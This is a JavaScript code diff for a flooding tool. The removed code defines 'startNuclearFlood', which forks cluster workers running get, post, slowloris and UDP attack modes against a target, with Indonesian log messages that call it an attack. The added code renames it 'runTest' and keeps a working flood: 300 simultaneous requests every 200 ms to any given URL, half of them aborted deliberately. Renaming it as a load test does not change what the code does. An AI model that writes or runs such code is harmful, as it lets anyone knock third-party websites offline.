@@ -1,78 +1,83 @@
-const cluster = require('cluster');
-const os = require('os');
-const url = require('url');
-const path = require('path');
+import axios from 'axios';
+import http from 'http';
+import https from 'https';
 
-function startNuclearFlood(targetUrl, durationSeconds, statusCallback) {
-    if (cluster.isPrimary) {
-        console.log(`Master ${process.pid} menyiapkan cluster untuk serangan.`);
-        
-        cluster.settings = {
-            exec: path.join(__dirname, 'worker.js'),
-            args: [targetUrl, String(durationSeconds)],
-            execArgv: ['--max-old-space-size=1024']
-        };
+let isTestRunning = false;
 
-        let totalSent = 0;
-        let totalError = 0;
-        let lastTotalSent = 0;
-        let currentRps = 0;
-        let secondsRemaining = durationSeconds;
+const httpAgent = new http.Agent({ keepAlive: true });
+const httpsAgent = new https.Agent({ keepAlive: true });
+const keepAliveAxios = axios.create({ httpAgent, httpsAgent });
 
-        const monitorInterval = setInterval(() => {
-            secondsRemaining -= 5;
-            if (secondsRemaining < 0) secondsRemaining = 0;
-
-            currentRps = Math.round((totalSent - lastTotalSent) / 5);
-            lastTotalSent = totalSent;
-
-            const successRate = totalSent > 0 ? ((totalSent - totalError) / totalSent * 100).toFixed(2) : "0.00";
-
-            statusCallback({
-                totalSent,
-                totalError,
-                successRate,
-                secondsRemaining,
-                rps: currentRps
-            });
-
-            if (secondsRemaining <= 0) {
-                clearInterval(monitorInterval);
-            }
-        }, 5000);
-
-        const numCPUs = 2;
-        const attackMethods = ['get', 'post', 'slowloris', 'udp'];
-        
-        for (let i = 0; i < numCPUs; i++) {
-            const workerAttackType = attackMethods[i % attackMethods.length];
-            const worker = cluster.fork({ 
-                ATTACK_TYPE: workerAttackType
-            });
-            worker.on('message', (message) => {
-                if (message.type === 'stats') {
-                    totalSent += message.sent || 0;
-                    totalError += message.error || 0;
-                }
-            });
-        }
-
-        cluster.on('exit', (worker) => {
-            console.log(`Worker ${worker.process.pid} telah berhenti.`);
-        });
-
-        const stopAttack = () => {
-            console.log("Master menerima perintah stop. Menghentikan semua worker.");
-            clearInterval(monitorInterval);
-            for (const id in cluster.workers) {
-                if (cluster.workers[id]) {
-                    cluster.workers[id].kill();
-                }
-            }
-        };
-
-        return { stop: stopAttack };
-    }
+export function stopTest() {
+  isTestRunning = false;
 }
 
-module.exports = { startNuclearFlood };
+export async function runTest(options) {
+  const {
+    targetUrl,
+    duration,
+    onProgress,
+    onComplete,
+  } = options;
+
+  const TOTAL_THREADS = 300;
+  const KEEP_ALIVE_THREADS = Math.floor(TOTAL_THREADS / 2);
+  const ABORT_THREADS = TOTAL_THREADS - KEEP_ALIVE_THREADS;
+  const DELAY_MS = 200;
+
+  if (isTestRunning) return;
+  isTestRunning = true;
+
+  let successCount = 0;
+  let errorCount = 0;
+  let totalRequestsSent = 0;
+  const startTime = Date.now();
+
+  while (isTestRunning && (Date.now() - startTime) / 1000 < duration) {
+    const promises = [];
+
+    for (let i = 0; i < KEEP_ALIVE_THREADS; i++) {
+      promises.push(
+        keepAliveAxios.get(targetUrl)
+          .then(() => { successCount++; })
+          .catch(() => { errorCount++; })
+      );
+    }
+
+    for (let i = 0; i < ABORT_THREADS; i++) {
+      const controller = new AbortController();
+      const requestPromise = axios.get(targetUrl, {
+        signal: controller.signal
+      }).catch(() => {
+        errorCount++;
+      });
+      controller.abort();
+      promises.push(requestPromise);
+    }
+
+    await Promise.all(promises);
+    totalRequestsSent += TOTAL_THREADS;
+
+    if (onProgress) {
+      const elapsed = (Date.now() - startTime) / 1000;
+      await onProgress({ elapsed: elapsed.toFixed(1), totalRequestsSent, successCount, errorCount });
+    }
+
+    await new Promise(resolve => setTimeout(resolve, DELAY_MS));
+  }
+
+  const endTime = Date.now();
+  const actualDuration = (endTime - startTime) / 1000;
+  const wasStopped = isTestRunning === false;
+  isTestRunning = false;
+
+  const results = {
+    actualDuration: actualDuration.toFixed(2),
+    successCount, errorCount, totalRequestsSent,
+    rps: (totalRequestsSent / actualDuration).toFixed(2) || '0.00',
+    stoppedByUser: wasStopped,
+  };
+
+  if (onComplete) await onComplete(results);
+  return results;
+}
